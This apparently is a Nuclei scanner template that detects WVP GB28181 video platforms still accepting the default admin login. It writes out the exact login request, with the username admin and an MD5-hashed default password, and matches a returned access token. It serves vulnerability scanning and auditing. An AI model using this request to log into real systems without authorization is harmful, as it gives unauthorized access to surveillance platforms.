id: poc-yaml-wvp-gb28181-login-default-password
info:
  name: WVP Video Platform (GB28181) Default Login Credential
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
  description: |
    This template checks for default login credentials on WVP Video Platform (GB28181) using the default username and MD5 hashed password.
http:
  - raw:
      - |
        GET /api/user/login?username=admin&password=21232f297a57a5a743894a0e4a801fc3 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\"accessToken\""
          - "\"code\":0"
        part: body
      - type: word
        part: body
        words:
          - "<"
        negative: true
